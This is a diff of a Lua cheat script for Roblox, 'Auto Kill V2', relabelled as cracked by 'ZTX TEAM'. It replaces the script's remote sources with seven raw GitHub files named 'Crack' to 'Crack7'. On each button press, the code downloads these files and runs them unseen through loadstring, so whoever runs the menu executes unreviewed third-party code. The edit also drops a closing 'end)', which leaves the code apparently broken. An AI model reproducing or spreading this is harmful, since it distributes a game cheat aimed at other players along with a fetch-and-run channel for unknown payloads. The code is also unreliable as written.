@@ -34,7 +34,7 @@ titleBar.Parent = mainFrame
 local titleButton = Instance.new("TextButton")
 titleButton.Size = UDim2.new(1,0,1,0)
 titleButton.BackgroundTransparency = 1
-titleButton.Text = "Auto Kill V2"
+titleButton.Text = "Auto Kill V2 Cracked By ZTX TEAM"
 titleButton.TextColor3 = Color3.fromRGB(255,255,255)
 titleButton.Font = Enum.Font.GothamBold
 titleButton.TextSize = 20
@@ -345,19 +345,29 @@ buttons["Espectear"].MouseButton1Click:Connect(function()
 end)
 
 buttons["Activar pegar muerto"].MouseButton1Click:Connect(function()
-    local url = "https://raw.githubusercontent.com/PheonixHub/Script-combinando-kill/refs/heads/main/Script%20para%20no%20comer%20eggs"
+    local urls = {
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack",
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack2",
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack3",
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack4",
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack5",
+    "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack6"
+}
+
+for _, url in ipairs(urls) do
     local success, response = pcall(function()
         return game:HttpGet(url)
     end)
+
     if success and response then
-        loadstring(response)()
+        pcall(loadstring(response))
     else
-        warn("Error cargando script 'Activar pegar muerto'")
+        warn("Erro ao carregar script: " .. url)
     end
-end)
+end
 
 buttons["Auto Kill a todos"].MouseButton1Click:Connect(function()
-    local url = "https://raw.githubusercontent.com/PheonixHub/Auto-kill-all-/refs/heads/main/Auto%20kill%20para%20todos"
+    local url = "https://raw.githubusercontent.com/SadOz8/Stuffs-2/refs/heads/main/Crack7"
     local success, response = pcall(function()
         return game:HttpGet(url)
     end)
